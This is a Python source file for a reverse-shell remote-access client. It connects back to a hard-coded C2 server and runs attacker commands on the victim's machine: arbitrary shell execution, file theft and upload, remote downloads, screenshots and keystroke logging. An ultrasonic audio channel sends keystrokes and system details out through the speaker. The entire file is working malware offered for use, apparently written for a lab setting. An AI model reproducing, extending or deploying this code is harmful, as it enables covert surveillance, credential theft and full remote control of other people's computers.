#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import argparse
import requests
import threading

try:
    from mss import mss
except ImportError:
    mss = None

# Add parent directory to path so payload_codec can be imported
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from payload_codec import encode_and_emit, FREQ_0, FREQ_1
except ImportError:
    # Fallback if standalone
    def encode_and_emit(text, pad_silence_sec=0.3, blocking=True):
        print(f"[!] payload_codec not available to emit: {text}")
        return False
    FREQ_0, FREQ_1 = 18500, 21000

try:
    import keylogger
except ImportError:
    keylogger = None

sock = None
admin = ""
keylogger_started = False

# ---------- Utility functions ----------

def reliable_send(data):
    """Send JSON data with newline delimiter"""
    try:
        msg = json.dumps(data) + "\n"
        sock.sendall(msg.encode("utf-8"))
    except Exception:
        pass

def reliable_recv():
    """Receive JSON data framed by newline"""
    buf = b""
    while b"\n" not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            raise Exception("Socket closed")
        buf += chunk
    line, _, remainder = buf.partition(b"\n")
    return json.loads(line.decode("utf-8"))

def is_admin():
    global admin
    try:
        os.listdir(os.sep.join([os.environ.get("SystemRoot", "C:\\windows"), "temp"]))
        admin = "[+] Administrator Privilege!"
    except Exception:
        admin = "[!!] User Privilege!"

def screenshot():
    if mss is not None:
        with mss() as sct:
            sct.shot()
    else:
        # Fallback using PIL or dummy if mss not installed
        try:
            from PIL import ImageGrab
            im = ImageGrab.grab()
            im.save("monitor-1.png")
        except Exception as e:
            raise Exception("Screenshot library (mss/pillow) not installed.")

def download(url):
    r = requests.get(url, timeout=10)
    fname = url.split("/")[-1] or "downloaded_file"
    with open(fname, "wb") as f:
        f.write(r.content)

# ---------- Shell loop ----------

def shell():
    global sock, keylogger_started
    while True:
        try:
            command = reliable_recv()

            if command == "q":
                break

            elif command.startswith("help"):
                help_text = f"""=== Standard C2 Commands ===
download <path>      -> Download file from target
upload <path>        -> Upload file to target
get <url>            -> Download from URL onto target
start <path>         -> Start program on target
screenshot           -> Capture target screenshot
check                -> Check administrator privileges
keylog_start         -> Start background keystroke logging
keylog_dump          -> Dump recorded keystrokes over socket

=== Ultrasonic Covert Channel ({FREQ_0}Hz / {FREQ_1}Hz) ===
acoustic_emit <text> -> Encode & release ultrasonic audio tone via target speaker
acoustic_keylog      -> Broadcast captured keystrokes via ultrasound
acoustic_sysinfo     -> Broadcast system info & privileges via ultrasound
q                    -> Quit session"""
                reliable_send(help_text)

            elif command.startswith("acoustic_emit "):
                text_to_emit = command[14:].strip()
                try:
                    threading.Thread(target=encode_and_emit, args=(text_to_emit, 0.3, True), daemon=True).start()
                    reliable_send(f"[+] Releasing ultrasonic tone ({FREQ_0}Hz / {FREQ_1}Hz) through PC speaker: '{text_to_emit}'")
                except Exception as e:
                    reliable_send(f"[!!] Acoustic emission failed: {str(e)}")

            elif command == "acoustic_keylog":
                if keylogger:
                    keys = keylogger.get_logged_keys()
                    preview = keys[:30]
                    threading.Thread(target=encode_and_emit, args=(f"KEYLOG:{keys}", 0.3, True), daemon=True).start()
                    reliable_send(f"[+] Broadcasting keystrokes ultrasonically ({len(keys)} chars, preview: '{preview}...')")
                else:
                    reliable_send("[!!] Keylogger module not loaded.")

            elif command == "acoustic_sysinfo":
                hostname = socket.gethostname()
                is_admin()
                info = f"SYS:{hostname}|ADM:{'YES' if 'Admin' in admin else 'NO'}"
                threading.Thread(target=encode_and_emit, args=(info, 0.3, True), daemon=True).start()
                reliable_send(f"[+] Broadcasting system info ultrasonically: '{info}'")

            elif command == "keylog_start":
                if keylogger and not keylogger_started:
                    try:
                        threading.Thread(target=keylogger.start, daemon=True).start()
                        keylogger_started = True
                        reliable_send("[+] Background keylogger started successfully.")
                    except Exception as e:
                        reliable_send(f"[!!] Failed to start keylogger: {str(e)}")
                elif keylogger_started:
                    reliable_send("[+] Keylogger is already running.")
                else:
                    reliable_send("[!!] Keylogger module not available.")

            elif command == "keylog_dump":
                if keylogger:
                    keys = keylogger.get_logged_keys()
                    reliable_send(f"--- CAPTURED KEYSTROKES ---\n{keys}\n-------------------------")
                else:
                    reliable_send("[!!] Keylogger module not available.")

            elif command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    reliable_send("[+] Changed directory to " + os.getcwd())
                except Exception as e:
                    reliable_send("[!!] Failed: " + str(e))

            elif command.startswith("download "):
                try:
                    path = command[9:].strip()
                    with open(path, "rb") as f:
                        data = base64.b64encode(f.read()).decode("ascii")
                        reliable_send(data)
                except Exception as e:
                    reliable_send("[!!] Download failed: " + str(e))

            elif command.startswith("upload "):
                try:
                    path = command[7:].strip()
                    data = reliable_recv()
                    with open(path, "wb") as f:
                        f.write(base64.b64decode(data.encode("ascii")))
                    reliable_send("[+] File uploaded to " + path)
                except Exception as e:
                    reliable_send("[!!] Upload failed: " + str(e))

            elif command.startswith("get "):
                try:
                    download(command[4:].strip())
                    reliable_send("[+] File downloaded")
                except Exception as e:
                    reliable_send("[!!] Failed: " + str(e))

            elif command.startswith("start "):
                try:
                    subprocess.Popen(command[6:].strip(), shell=True)
                    reliable_send("[+] Started")
                except Exception as e:
                    reliable_send("[!!] Failed: " + str(e))

            elif command.startswith("screenshot"):
                try:
                    screenshot()
                    sc_path = "monitor-1.png"
                    if os.path.exists(sc_path):
                        with open(sc_path, "rb") as sc:
                            img = base64.b64encode(sc.read()).decode("ascii")
                            reliable_send(img)
                        try:
                            os.remove(sc_path)
                        except Exception:
                            pass
                    else:
                        reliable_send("[!!] Screenshot file not found")
                except Exception as e:
                    reliable_send("[!!] Screenshot failed: " + str(e))

            elif command.startswith("check"):
                is_admin()
                reliable_send(admin)

            else:
                try:
                    proc = subprocess.Popen(command, shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    result = proc.stdout.read() + proc.stderr.read()
                    reliable_send(result.decode("utf-8", errors="ignore"))
                except Exception as e:
                    reliable_send("[!!] Execution failed: " + str(e))

        except Exception as e:
            reliable_send("[!!] Error: " + str(e))
            break

# ---------- Connection loop ----------

def connection(host="192.168.218.129", port=54321):
    global sock
    print(f"[*] Reverse Shell Client targeting C2 Server at {host}:{port}...")
    while True:
        time.sleep(3)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            print(f"[+] Connected to C2 Server at {host}:{port}")
            shell()
        except Exception:
            try:
                sock.close()
            except Exception:
                pass

# ---------- Entry ----------

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Reverse Shell with Ultrasonic Covert Channel (Client)")
    parser.add_argument("--host", default="192.168.218.129", help="C2 Server IP address (default: 192.168.218.129)")
    parser.add_argument("--port", type=int, default=54321, help="C2 Server Port (default: 54321)")
    args = parser.parse_args()

    connection(host=args.host, port=args.port)

